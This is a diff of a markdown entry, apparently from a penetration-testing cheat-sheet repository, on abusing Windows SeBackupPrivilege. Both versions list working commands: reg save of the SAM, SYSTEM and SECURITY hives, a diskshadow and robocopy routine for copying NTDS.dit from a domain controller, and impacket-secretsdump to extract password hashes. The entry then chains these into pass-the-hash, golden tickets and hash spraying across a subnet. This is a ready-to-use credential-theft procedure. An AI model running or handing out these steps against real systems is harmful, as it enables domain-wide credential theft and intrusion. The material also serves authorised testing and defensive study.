@@ -3,25 +3,31 @@ id: windows-sebackup
 title: SeBackupPrivilege
 stage: privesc
 tags: [windows, ad]
-tools:
-  - "whoami /priv | findstr /i SeBackupPrivilege"
-  - "reg save HKLM\\SAM C:\\Temp\\SAM"
-  - impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+summary: Use SeBackupPrivilege to bypass ACLs and read any file — dump SAM/SYSTEM for local hashes, or dump NTDS.dit from a DC for every domain account hash.
 leads_to:
   - pass-the-hash
   - domain-admin
   - dcsync
 ---
 
-## Check
+## Prerequisites
+
+A shell with `SeBackupPrivilege` enabled — common on Backup Operators group members and some service accounts. `whoami /priv` must show this privilege as Enabled. On a DC, this gives you the entire domain.
+
+SeBackupPrivilege grants the right to read any file regardless of its DACL — it's designed for backup software. This means SAM, SYSTEM, SECURITY (local hashes on any machine), and NTDS.dit (domain hashes on a DC) are all readable. The `reg save` method works from any cmd prompt; NTDS.dit on a DC requires diskshadow to work around the exclusive file lock.
+
+## Quick Win
+
+> Check the privilege, dump SAM/SYSTEM immediately — two commands and you have local hashes.
 
 ```cmd
 whoami /priv | findstr /i "SeBackupPrivilege"
+reg save HKLM\SAM C:\Temp\SAM && reg save HKLM\SYSTEM C:\Temp\SYSTEM
 ```
 
-Common on: Backup Operators group members, some service accounts.
+## Dump SAM / SYSTEM (Any Machine)
 
-## Dump SAM/SYSTEM (any machine)
+> Extract local account hashes — Administrator hash lets you PTH to other machines.
 
 ```cmd
 reg save HKLM\SAM C:\Temp\SAM
@@ -30,16 +36,16 @@ reg save HKLM\SECURITY C:\Temp\SECURITY
 ```
 
 ```bash
-# Transfer to attacker, then extract hashes
+# Transfer files to attacker, then extract hashes
 impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
 ```
 
-## Dump NTDS.dit (DC only — full domain hash dump)
+## Dump NTDS.dit (DC Only — Full Domain Hashes)
+
+> diskshadow creates a VSS copy that isn't locked — required because ntds.dit is in use.
 
 ```powershell
-# diskshadow method
-diskshadow /s C:\Temp\shadow.txt
-# shadow.txt contents:
+# Create shadow.txt on target:
 # set verbose on
 # set metadata C:\Temp\meta.cab
 # set context clientaccessible
@@ -49,16 +55,18 @@ diskshadow /s C:\Temp\shadow.txt
 # expose %cdrive% Z:
 # end backup
 
-# After shadow is created:
+diskshadow /s C:\Temp\shadow.txt
+
+# Copy ntds.dit from the shadow
 robocopy /b Z:\Windows\NTDS\ C:\Temp\ ntds.dit
-
-# Get SYSTEM hive for decryption key
 reg save HKLM\SYSTEM C:\Temp\SYSTEM
+```
 
-# Transfer both to attacker, then:
+```bash
+# Transfer both to attacker, then dump all domain hashes
 impacket-secretsdump -ntds C:\Temp\ntds.dit -system C:\Temp\SYSTEM LOCAL
 ```
 
-## Notes
+## Leads To
 
-SeBackupPrivilege lets you bypass ACLs to read any file on disk — SAM and NTDS.dit are the primary targets. On a DC, ntds.dit gives you every domain account hash.
+SAM + SYSTEM dump → local Administrator hash → pass-the-hash laterally. NTDS.dit from DC → every domain account hash → domain-admin. krbtgt hash from NTDS dump → golden-ticket persistence. Spray Administrator hash across subnet → `nxc smb` + hash → access to all domain machines sharing local admin password.
